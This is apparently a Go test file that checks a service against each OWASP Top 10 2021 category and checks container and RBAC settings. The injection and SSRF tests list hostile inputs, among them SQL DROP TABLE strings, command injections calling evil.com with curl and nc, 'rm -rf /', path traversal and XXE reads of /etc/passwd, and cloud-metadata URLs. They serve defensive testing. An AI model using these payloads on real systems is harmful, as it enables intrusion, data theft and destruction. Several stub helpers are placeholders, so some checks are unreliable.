package security_test

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestOWASPTop10Compliance validates compliance with OWASP Top 10 2021
func TestOWASPTop10Compliance(t *testing.T) {
	t.Run("A01_BrokenAccessControl", func(t *testing.T) {
		// Test horizontal privilege escalation
		t.Run("PreventHorizontalEscalation", func(t *testing.T) {
			client1 := createAuthenticatedClient(t, "user1", []string{"read"})
			client2 := createAuthenticatedClient(t, "user2", []string{"read"})
			
			// User1 creates a resource
			resource := createResource(t, client1, "user1-resource")
			
			// User2 should not be able to modify user1's resource
			err := modifyResource(client2, resource.ID)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "forbidden")
		})
		
		// Test vertical privilege escalation
		t.Run("PreventVerticalEscalation", func(t *testing.T) {
			regularUser := createAuthenticatedClient(t, "regular", []string{"user"})
			
			// Regular user should not be able to perform admin actions
			err := performAdminAction(regularUser, "delete-all")
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "insufficient privileges")
		})
		
		// Test JWT validation
		t.Run("ValidateJWTClaims", func(t *testing.T) {
			tests := []struct {
				name      string
				token     string
				wantError string
			}{
				{
					name:      "ExpiredToken",
					token:     generateExpiredToken(),
					wantError: "token expired",
				},
				{
					name:      "InvalidSignature",
					token:     generateTokenWithBadSignature(),
					wantError: "signature verification failed",
				},
				{
					name:      "MissingRequiredClaims",
					token:     generateTokenWithoutClaims(),
					wantError: "missing required claims",
				},
				{
					name:      "InvalidAudience",
					token:     generateTokenWithWrongAudience(),
					wantError: "invalid audience",
				},
			}
			
			for _, tt := range tests {
				t.Run(tt.name, func(t *testing.T) {
					err := validateToken(tt.token)
					assert.Error(t, err)
					assert.Contains(t, err.Error(), tt.wantError)
				})
			}
		})
	})
	
	t.Run("A02_CryptographicFailures", func(t *testing.T) {
		// Test encryption at rest
		t.Run("SecretsEncryptedAtRest", func(t *testing.T) {
			secret := createSecret(t, "test-secret", "sensitive-data")
			
			// Verify secret is not stored in plain text
			stored, err := getStoredSecret(secret.ID)
			require.NoError(t, err)
			
			assert.NotEqual(t, "sensitive-data", stored.Value)
			assert.True(t, isEncrypted(stored.Value))
		})
		
		// Test TLS configuration
		t.Run("StrongTLSConfiguration", func(t *testing.T) {
			conn, err := tls.Dial("tcp", getTestEndpoint(), &tls.Config{
				MinVersion: tls.VersionTLS12,
			})
			require.NoError(t, err)
			defer conn.Close()
			
			// Verify TLS version
			assert.GreaterOrEqual(t, conn.ConnectionState().Version, uint16(tls.VersionTLS12))
			
			// Verify strong cipher suite
			supportedCiphers := []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			}
			assert.Contains(t, supportedCiphers, conn.ConnectionState().CipherSuite)
		})
		
		// Test password handling
		t.Run("SecurePasswordStorage", func(t *testing.T) {
			password := "TestP@ssw0rd123!"
			
			// Create user with password
			user := createUser(t, "testuser", password)
			
			// Verify password is hashed
			stored, err := getStoredUser(user.ID)
			require.NoError(t, err)
			
			assert.NotEqual(t, password, stored.PasswordHash)
			assert.True(t, isArgon2Hash(stored.PasswordHash))
		})
	})
	
	t.Run("A03_Injection", func(t *testing.T) {
		// SQL Injection tests
		t.Run("PreventSQLInjection", func(t *testing.T) {
			payloads := []string{
				"'; DROP TABLE users; --",
				"' OR '1'='1",
				"admin'--",
				"' UNION SELECT * FROM secrets--",
				"1; EXEC sp_MSforeachtable 'DROP TABLE ?'",
			}
			
			for _, payload := range payloads {
				t.Run(sanitizeTestName(payload), func(t *testing.T) {
					err := searchWithPayload(payload)
					assert.NoError(t, err) // Should handle safely
					
					// Verify tables still exist
					assert.True(t, tableExists("users"))
					assert.True(t, tableExists("secrets"))
				})
			}
		})
		
		// Command Injection tests
		t.Run("PreventCommandInjection", func(t *testing.T) {
			payloads := []string{
				"test; cat /etc/passwd",
				"test && rm -rf /",
				"test`whoami`",
				"test$(curl evil.com)",
				"test|nc evil.com 1234",
			}
			
			for _, payload := range payloads {
				t.Run(sanitizeTestName(payload), func(t *testing.T) {
					result, err := executeWithPayload(payload)
					assert.NoError(t, err)
					
					// Verify no command execution occurred
					assert.NotContains(t, result, "root:")
					assert.NotContains(t, result, "daemon:")
				})
			}
		})
		
		// Path Traversal tests (already well-covered)
		t.Run("PreventPathTraversal", func(t *testing.T) {
			payloads := []string{
				"../../../etc/passwd",
				"..\\..\\..\\windows\\system32\\config\\sam",
				"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
				"....//....//....//etc/passwd",
				"file:///etc/passwd",
			}
			
			for _, payload := range payloads {
				t.Run(sanitizeTestName(payload), func(t *testing.T) {
					_, err := accessFileWithPayload(payload)
					assert.Error(t, err)
					assert.Contains(t, err.Error(), "path traversal")
				})
			}
		})
		
		// XXE Injection tests
		t.Run("PreventXXEInjection", func(t *testing.T) {
			xxePayload := `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`
			
			result, err := processXML(xxePayload)
			assert.NoError(t, err)
			assert.NotContains(t, result, "root:")
		})
	})
	
	t.Run("A04_InsecureDesign", func(t *testing.T) {
		// Rate limiting tests
		t.Run("EnforceRateLimiting", func(t *testing.T) {
			client := createClient()
			endpoint := "/api/v1/intents"
			
			// Make requests up to the limit
			for i := 0; i < 100; i++ {
				resp, err := client.Get(endpoint)
				require.NoError(t, err)
				assert.Equal(t, http.StatusOK, resp.StatusCode)
			}
			
			// Next request should be rate limited
			resp, err := client.Get(endpoint)
			require.NoError(t, err)
			assert.Equal(t, http.StatusTooManyRequests, resp.StatusCode)
			
			// Verify Retry-After header
			retryAfter := resp.Header.Get("Retry-After")
			assert.NotEmpty(t, retryAfter)
		})
		
		// Business logic validation
		t.Run("ValidateBusinessLogic", func(t *testing.T) {
			// Test negative values
			err := createIntent("test", -10)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "replicas must be positive")
			
			// Test excessive values
			err = createIntent("test", 10000)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "exceeds maximum")
			
			// Test invalid state transitions
			intent := createValidIntent(t)
			err = transitionState(intent, "DELETED", "ACTIVE")
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "invalid state transition")
		})
	})
	
	t.Run("A05_SecurityMisconfiguration", func(t *testing.T) {
		// Security headers tests
		t.Run("ValidateSecurityHeaders", func(t *testing.T) {
			resp, err := http.Get(getTestEndpoint())
			require.NoError(t, err)
			defer resp.Body.Close()
			
			// Required security headers
			headers := map[string]string{
				"X-Content-Type-Options":    "nosniff",
				"X-Frame-Options":           "DENY",
				"Content-Security-Policy":   "default-src 'self'",
				"Referrer-Policy":          "strict-origin-when-cross-origin",
				"Permissions-Policy":       "geolocation=()",
			}
			
			for header, expected := range headers {
				actual := resp.Header.Get(header)
				assert.Contains(t, actual, expected, "Missing or incorrect %s header", header)
			}
			
			// HSTS for HTTPS
			if strings.HasPrefix(getTestEndpoint(), "https") {
				hsts := resp.Header.Get("Strict-Transport-Security")
				assert.NotEmpty(t, hsts)
				assert.Contains(t, hsts, "max-age=")
			}
		})
		
		// Error handling tests
		t.Run("SecureErrorMessages", func(t *testing.T) {
			// Trigger various errors
			errors := []struct {
				trigger string
				check   func(string) bool
			}{
				{
					trigger: "sql_error",
					check: func(msg string) bool {
						return !strings.Contains(msg, "SELECT") &&
							   !strings.Contains(msg, "FROM") &&
							   !strings.Contains(msg, "table")
					},
				},
				{
					trigger: "path_error",
					check: func(msg string) bool {
						return !strings.Contains(msg, "/etc/") &&
							   !strings.Contains(msg, "/var/") &&
							   !strings.Contains(msg, "C:\\")
					},
				},
			}
			
			for _, test := range errors {
				err := triggerError(test.trigger)
				assert.Error(t, err)
				assert.True(t, test.check(err.Error()), 
					"Error message reveals sensitive info: %s", err.Error())
			}
		})
	})
	
	t.Run("A06_VulnerableComponents", func(t *testing.T) {
		// Dependency vulnerability checks
		t.Run("CheckDependencyVulnerabilities", func(t *testing.T) {
			vulns, err := scanDependencies()
			require.NoError(t, err)
			
			// No critical vulnerabilities allowed
			criticalVulns := filterBySeverity(vulns, "CRITICAL")
			assert.Empty(t, criticalVulns, 
				"Critical vulnerabilities found: %v", criticalVulns)
			
			// Limited high vulnerabilities
			highVulns := filterBySeverity(vulns, "HIGH")
			assert.LessOrEqual(t, len(highVulns), 3, 
				"Too many high severity vulnerabilities: %v", highVulns)
		})
		
		// Container image scanning
		t.Run("ScanContainerImages", func(t *testing.T) {
			images := []string{
				"ghcr.io/nephoran/operator:latest",
				"ghcr.io/nephoran/llm-processor:latest",
			}
			
			for _, image := range images {
				t.Run(image, func(t *testing.T) {
					vulns, err := scanImage(image)
					require.NoError(t, err)
					
					// Check for known vulnerable components
					assert.NotContains(t, vulns, "log4j")
					assert.NotContains(t, vulns, "spring4shell")
				})
			}
		})
	})
	
	t.Run("A07_IdentificationAuthentication", func(t *testing.T) {
		// Multi-factor authentication tests
		t.Run("EnforceMFA", func(t *testing.T) {
			// Login with just password should require MFA
			resp, err := login("user", "password")
			require.NoError(t, err)
			
			assert.Equal(t, "mfa_required", resp.Status)
			assert.NotEmpty(t, resp.MFAChallenge)
			
			// Complete MFA
			token, err := completeMFA(resp.MFAChallenge, "123456")
			require.NoError(t, err)
			assert.NotEmpty(t, token)
		})
		
		// Session management tests
		t.Run("SecureSessionManagement", func(t *testing.T) {
			session := createSession(t, "testuser")
			
			// Verify session timeout
			time.Sleep(31 * time.Minute) // Assuming 30 min timeout
			err := useSession(session)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "session expired")
			
			// Verify session invalidation on logout
			newSession := createSession(t, "testuser")
			logout(t, newSession)
			err = useSession(newSession)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "invalid session")
		})
		
		// Password policy tests
		t.Run("EnforcePasswordPolicy", func(t *testing.T) {
			weakPasswords := []string{
				"password",
				"12345678",
				"testtest",
				"Password1", // No special char
				"Test@123",  // Too short
			}
			
			for _, pwd := range weakPasswords {
				err := setPassword("user", pwd)
				assert.Error(t, err)
				assert.Contains(t, err.Error(), "password policy")
			}
			
			// Strong password should work
			err := setPassword("user", "Test@Password123!")
			assert.NoError(t, err)
		})
	})
	
	t.Run("A08_SoftwareDataIntegrity", func(t *testing.T) {
		// Code signing verification
		t.Run("VerifyCodeSigning", func(t *testing.T) {
			packages := []string{
				"nephoran-operator",
				"llm-processor",
			}
			
			for _, pkg := range packages {
				t.Run(pkg, func(t *testing.T) {
					signature, err := getPackageSignature(pkg)
					require.NoError(t, err)
					
					valid, err := verifySignature(pkg, signature)
					require.NoError(t, err)
					assert.True(t, valid)
				})
			}
		})
		
		// Supply chain security
		t.Run("ValidateSupplyChain", func(t *testing.T) {
			// Verify SBOM exists
			sbom, err := getSBOM()
			require.NoError(t, err)
			assert.NotEmpty(t, sbom.Components)
			
			// Verify provenance
			provenance, err := getProvenance()
			require.NoError(t, err)
			assert.NotEmpty(t, provenance.BuilderID)
			assert.True(t, provenance.Reproducible)
		})
	})
	
	t.Run("A09_SecurityLogging", func(t *testing.T) {
		// Audit logging tests
		t.Run("ComprehensiveAuditLogging", func(t *testing.T) {
			// Perform security-relevant action
			action := performSecurityAction(t, "modify_rbac")
			
			// Verify audit log entry
			logs, err := getAuditLogs(action.ID)
			require.NoError(t, err)
			assert.NotEmpty(t, logs)
			
			log := logs[0]
			assert.Equal(t, "MODIFY_RBAC", log.Action)
			assert.NotEmpty(t, log.UserID)
			assert.NotEmpty(t, log.Timestamp)
			assert.NotEmpty(t, log.SourceIP)
			
			// Verify no sensitive data in logs
			assert.NotContains(t, log.Details, "password")
			assert.NotContains(t, log.Details, "token")
			assert.NotContains(t, log.Details, "secret")
		})
		
		// Log tampering protection
		t.Run("PreventLogTampering", func(t *testing.T) {
			// Create audit log entry
			originalLog := createAuditLog(t, "test_action")
			
			// Attempt to modify log
			err := modifyAuditLog(originalLog.ID, "modified_action")
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "immutable")
			
			// Verify log integrity
			currentLog, err := getAuditLog(originalLog.ID)
			require.NoError(t, err)
			assert.Equal(t, originalLog.Hash, currentLog.Hash)
		})
	})
	
	t.Run("A10_SSRF", func(t *testing.T) {
		// SSRF prevention tests
		t.Run("PreventSSRF", func(t *testing.T) {
			ssrfPayloads := []string{
				"http://169.254.169.254/latest/meta-data/",
				"http://localhost:8080/admin",
				"http://127.0.0.1:22",
				"file:///etc/passwd",
				"gopher://localhost:8080",
				"dict://localhost:11211",
			}
			
			for _, payload := range ssrfPayloads {
				t.Run(sanitizeTestName(payload), func(t *testing.T) {
					_, err := fetchURL(payload)
					assert.Error(t, err)
					assert.Contains(t, err.Error(), "blocked")
				})
			}
		})
		
		// DNS rebinding protection
		t.Run("PreventDNSRebinding", func(t *testing.T) {
			// Test domain that resolves to internal IP
			_, err := fetchURL("http://rebind.evil.com")
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "internal IP")
		})
	})
}

// TestContainerSecurityCompliance validates container security settings
func TestContainerSecurityCompliance(t *testing.T) {
	t.Run("SecurityContext", func(t *testing.T) {
		pods := getRunningPods(t)
		
		for _, pod := range pods {
			t.Run(pod.Name, func(t *testing.T) {
				// Pod security context
				assert.NotNil(t, pod.Spec.SecurityContext)
				assert.True(t, *pod.Spec.SecurityContext.RunAsNonRoot)
				assert.NotNil(t, pod.Spec.SecurityContext.FSGroup)
				assert.Greater(t, *pod.Spec.SecurityContext.FSGroup, int64(0))
				
				// Container security contexts
				for _, container := range pod.Spec.Containers {
					t.Run(container.Name, func(t *testing.T) {
						sc := container.SecurityContext
						assert.NotNil(t, sc)
						
						// Read-only root filesystem
						assert.True(t, *sc.ReadOnlyRootFilesystem)
						
						// No privilege escalation
						assert.False(t, *sc.AllowPrivilegeEscalation)
						
						// Not privileged
						assert.False(t, *sc.Privileged)
						
						// Capabilities dropped
						assert.Contains(t, sc.Capabilities.Drop, "ALL")
						
						// No dangerous capabilities added
						for _, cap := range sc.Capabilities.Add {
							assert.NotContains(t, []string{"SYS_ADMIN", "NET_ADMIN", "ALL"}, cap)
						}
					})
				}
			})
		}
	})
	
	t.Run("NetworkPolicies", func(t *testing.T) {
		policies := getNetworkPolicies(t)
		
		// Verify default deny policy exists
		foundDefaultDeny := false
		for _, policy := range policies {
			if policy.Name == "default-deny-all" {
				foundDefaultDeny = true
				assert.Empty(t, policy.Spec.Ingress)
				assert.Empty(t, policy.Spec.Egress)
			}
		}
		assert.True(t, foundDefaultDeny, "Default deny-all network policy not found")
		
		// Verify specific service policies
		requiredPolicies := []string{
			"nephoran-operator-network-policy",
			"llm-processor-network-policy",
		}
		
		for _, required := range requiredPolicies {
			found := false
			for _, policy := range policies {
				if policy.Name == required {
					found = true
					// Verify has specific rules
					assert.NotEmpty(t, policy.Spec.Ingress)
					assert.NotEmpty(t, policy.Spec.Egress)
				}
			}
			assert.True(t, found, "Required network policy %s not found", required)
		}
	})
	
	t.Run("ResourceLimits", func(t *testing.T) {
		deployments := getDeployments(t)
		
		for _, deployment := range deployments {
			for _, container := range deployment.Spec.Template.Spec.Containers {
				t.Run(fmt.Sprintf("%s/%s", deployment.Name, container.Name), func(t *testing.T) {
					// CPU limits
					assert.NotNil(t, container.Resources.Limits.Cpu())
					assert.Greater(t, container.Resources.Limits.Cpu().MilliValue(), int64(0))
					
					// Memory limits
					assert.NotNil(t, container.Resources.Limits.Memory())
					assert.Greater(t, container.Resources.Limits.Memory().Value(), int64(0))
					
					// Requests should be set
					assert.NotNil(t, container.Resources.Requests.Cpu())
					assert.NotNil(t, container.Resources.Requests.Memory())
				})
			}
		}
	})
}

// TestRBACCompliance validates RBAC configuration
func TestRBACCompliance(t *testing.T) {
	t.Run("NoWildcardPermissions", func(t *testing.T) {
		roles := getClusterRoles(t)
		
		for _, role := range roles {
			// Skip system roles
			if strings.HasPrefix(role.Name, "system:") {
				continue
			}
			
			t.Run(role.Name, func(t *testing.T) {
				for _, rule := range role.Rules {
					// No wildcard API groups
					for _, apiGroup := range rule.APIGroups {
						assert.NotEqual(t, "*", apiGroup, 
							"Wildcard API group in role %s", role.Name)
					}
					
					// No wildcard resources
					for _, resource := range rule.Resources {
						assert.NotEqual(t, "*", resource,
							"Wildcard resource in role %s", role.Name)
					}
					
					// No wildcard verbs
					for _, verb := range rule.Verbs {
						assert.NotEqual(t, "*", verb,
							"Wildcard verb in role %s", role.Name)
					}
				}
			})
		}
	})
	
	t.Run("NoClusterAdminBindings", func(t *testing.T) {
		bindings := getClusterRoleBindings(t)
		
		for _, binding := range bindings {
			// Skip system bindings
			if strings.HasPrefix(binding.Name, "system:") {
				continue
			}
			
			if binding.RoleRef.Name == "cluster-admin" {
				t.Errorf("cluster-admin binding found: %s", binding.Name)
			}
		}
	})
	
	t.Run("ServiceAccountsNotDefault", func(t *testing.T) {
		pods := getRunningPods(t)
		
		for _, pod := range pods {
			assert.NotEqual(t, "default", pod.Spec.ServiceAccountName,
				"Pod %s using default service account", pod.Name)
			
			// Verify automount is disabled when not needed
			if pod.Spec.AutomountServiceAccountToken != nil {
				assert.False(t, *pod.Spec.AutomountServiceAccountToken,
					"Pod %s unnecessarily mounting service account token", pod.Name)
			}
		}
	})
}

// Helper functions
func sanitizeTestName(name string) string {
	// Replace problematic characters for test names
	replacer := strings.NewReplacer(
		"/", "_",
		"\\", "_",
		":", "_",
		";", "_",
		" ", "_",
		"'", "",
		"\"", "",
		"`", "",
	)
	return replacer.Replace(name)
}

func isEncrypted(value string) bool {
	// Check if value appears to be encrypted (high entropy, base64, etc.)
	// Implementation would check for encryption markers
	return true
}

func isArgon2Hash(hash string) bool {
	// Check if hash is in Argon2 format
	return strings.HasPrefix(hash, "$argon2")
}

// Stub functions for test utilities
func createAuthenticatedClient(t *testing.T, user string, roles []string) *http.Client {
	// Implementation would create authenticated HTTP client
	return &http.Client{}
}

func createResource(t *testing.T, client *http.Client, name string) *Resource {
	// Implementation would create a test resource
	return &Resource{ID: "test-id"}
}

func modifyResource(client *http.Client, id string) error {
	// Implementation would attempt to modify resource
	return nil
}

func performAdminAction(client *http.Client, action string) error {
	// Implementation would attempt admin action
	return nil
}

type Resource struct {
	ID string
}